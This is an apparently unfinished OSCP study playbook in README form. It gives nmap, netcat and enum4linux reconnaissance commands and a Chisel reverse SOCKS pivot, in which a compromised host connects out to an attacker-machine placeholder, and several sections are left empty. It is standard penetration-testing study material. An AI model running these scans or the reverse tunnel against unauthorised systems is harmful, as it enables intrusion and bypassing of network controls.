![alt text](https://github.com/GunzyPunzy/Gunnajs-Playbook-OSCP/blob/main/anfader-oscp.jpg)

# Reconnaissance

<details>
  <summary><strong>Nmap</strong></summary>

### Basic Scan
```bash
nmap -sC -sV <target>
````

### Full TCP Scan

```bash
nmap -p- -sS -sV <target>
```

### UDP Scan

```bash
nmap -sU --top-ports 100 <target>
```

#### Use if host blocks ICMP / appears down

```bash
nmap -Pn <target>
```

</details>

<details>
  <summary><strong>Banner Grabbing</strong></summary>

```bash
nc <target> <port>
```

```bash
nmap --script banner -p <port> <target>
```

</details>

<details>
  <summary><strong>enum4linux</strong></summary>

```bash
enum4linux -a <target>
```

</details>

# Exploitation</strong></summary>

# WebApp

# Pivoting

<details>
  <summary> Chisel </summary> 

  ### Creating a server
  ```shell
  chisel server --port <PORT> --reverse
  ```

  ### Edit /etc/proxychains4.conf
  ```shell
  [ProxyList]
  socks5 127.0.0.1 1080
  ```

  ### Connecting from the client

   ```shell
  .\chisel client <ATTACK_MACHINE_IP>:<PORT> R:socks
  ```

  ### Sending command via the tunnel
  ```shell
  proxychains -q <command>
  ```

</details> 

# File Transfers

# Windows 

# Linux
